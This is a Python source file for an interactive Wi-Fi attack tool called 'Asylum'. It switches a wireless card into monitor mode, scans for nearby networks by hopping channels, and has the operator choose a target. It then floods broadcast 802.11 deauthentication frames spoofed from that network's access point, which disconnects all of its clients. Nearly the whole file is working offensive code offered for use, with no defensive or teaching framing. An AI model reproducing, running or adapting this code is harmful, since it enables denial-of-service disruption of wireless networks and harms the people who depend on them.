import subprocess
import re
import time
import os
import atexit
import signal
import logging
from scapy.all import *
from colorama import Fore, init
import pyfiglet

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
init(autoreset=True)

networks = []
iface = ""
stop_attack = False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(Fore.RED + pyfiglet.figlet_format("Asylum"))
    print(Fore.GREEN)

def check_root():
    if os.name == 'nt': 
        print("This script is designed for Linux and will not work correctly on Windows.")
        print("Please use a Linux system to run this script.")
        return False
    else:  
        return os.geteuid() == 0

def set_monitor_mode(iface):
    print(f"Putting {iface} into monitor mode...")
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"], check=True)
        subprocess.run(["sudo", "iwconfig", iface, "mode", "monitor"], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)
        print(f"{iface} is now in monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"Error setting monitor mode: {e}")
        return False
    
    try:
        output = subprocess.check_output(["iwconfig", iface], universal_newlines=True)
        if "Mode:Monitor" in output:
            print("Monitor mode successfully set.")
            return True
        else:
            print("Failed to set monitor mode. Please check your wireless card capabilities.")
            return False
    except subprocess.CalledProcessError as e:
        print(f"Error verifying monitor mode: {e}")
        return False

def set_managed_mode(iface):
    print(f"Putting {iface} back into managed mode...")
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"], check=True)
        subprocess.run(["sudo", "iwconfig", iface, "mode", "managed"], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)
        print(f"{iface} is now back in managed mode.")
    except subprocess.CalledProcessError as e:
        print(f"Error setting managed mode: {e}")

def cleanup():
    if iface:
        set_managed_mode(iface)

def get_wifi_interfaces():
    interfaces = []
    try:
        output = subprocess.check_output(["iw", "dev"], universal_newlines=True)
        interfaces = re.findall(r"Interface\s+(\w+)", output)
    except subprocess.CalledProcessError as e:
        print(f"Error getting WiFi interfaces: {e}")
    return interfaces

def choose_interface():
    global iface
    interfaces = get_wifi_interfaces()
    if not interfaces:
        print("No WiFi interfaces found.")
        return False
    
    print("Available interfaces:")
    for i, interface in enumerate(interfaces, 1):
        print(f"{i}. {interface}")
    
    while True:
        choice = input("Choose an interface: ")
        try:
            index = int(choice) - 1
            if 0 <= index < len(interfaces):
                iface = interfaces[index]
                break
            else:
                print("Invalid choice. Try again.")
        except ValueError:
            print("Please enter a number.")
    
    return set_monitor_mode(iface)

def channel_hopper(iface):
    while not stop_attack:
        channel = random.randint(1, 14)
        try:
            subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True)
        except subprocess.CalledProcessError:
            pass
        time.sleep(0.5)

def scan_networks():
    global networks
    print("Scanning for networks...")
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            essid = pkt[Dot11Elt].info.decode(errors='ignore')
            try:
                channel = int(ord(pkt[Dot11Elt:3].info))
            except:
                channel = 0
            if not any(network['bssid'] == bssid for network in networks):
                networks.append({"bssid": bssid, "essid": essid, "channel": channel})
                print(f"Found network: BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")

    hopper = threading.Thread(target=channel_hopper, args=(iface,))
    hopper.daemon = True
    hopper.start()

    print(f"Starting scan on interface {iface}...")
    try:
        sniff(iface=iface, prn=packet_handler, timeout=30)
    except Exception as e:
        print(f"Error during scanning: {e}")
    
    global stop_attack
    stop_attack = True
    hopper.join()
    stop_attack = False

    print(f"Scan completed. Found {len(networks)} networks.")

def print_networks():
    print("\nAvailable networks:")
    print("ID\tBSSID\t\t\tChannel\tESSID")
    print("-" * 60)
    for i, network in enumerate(networks):
        print(f"{i+1}\t{network['bssid']}\t{network['channel']}\t{network['essid']}")

def choose_network():
    while True:
        choice = input("Choose a network to attack (or 'q' to quit): ")
        if choice.lower() == 'q':
            return None
        try:
            index = int(choice) - 1
            if 0 <= index < len(networks):
                return networks[index]
            else:
                print("Invalid choice. Try again.")
        except ValueError:
            print("Please enter a number or 'q' to quit.")

def deauth_attack(network):
    global stop_attack
    target_mac = "FF:FF:FF:FF:FF:FF" 
    gateway_mac = network['bssid']
    
    try:
        subprocess.run(["iwconfig", iface, "channel", str(network['channel'])], check=True)
    except subprocess.CalledProcessError:
        print(f"Failed to set channel to {network['channel']}. Continuing anyway.")
    
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    print(f"Starting deauth attack on {network['essid']} (BSSID: {network['bssid']}, Channel: {network['channel']})...")
    print("Press Ctrl+C to stop the attack.")
    
    try:
        while not stop_attack:
            for i in range(64): 
                sendp(packet, iface=iface, count=1, inter=0.002, verbose=False)
            print(f"Sent deauth burst to {network['essid']}")
            time.sleep(0.5) 
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        stop_attack = False
        print("Deauth attack completed.")

def signal_handler(sig, frame):
    global stop_attack
    print("\nCtrl+C pressed. Stopping attack...")
    stop_attack = True

def main():
    if not check_root():
        print("This script must be run as root.")
        exit(1)
    
    print_banner()
    
    if not choose_interface():
        print("Failed to set up interface. Exiting.")
        return

    time.sleep(2) 
    scan_networks()
    if not networks:
        print("No networks found. Please check your wireless card and try again.")
        return

    print_networks()
    target_network = choose_network()
    if not target_network:
        print("No network selected. Exiting.")
        return

    signal.signal(signal.SIGINT, signal_handler)
    deauth_attack(target_network)

if __name__ == "__main__":
    atexit.register(cleanup)
    try:
        main()
    finally:
        cleanup()

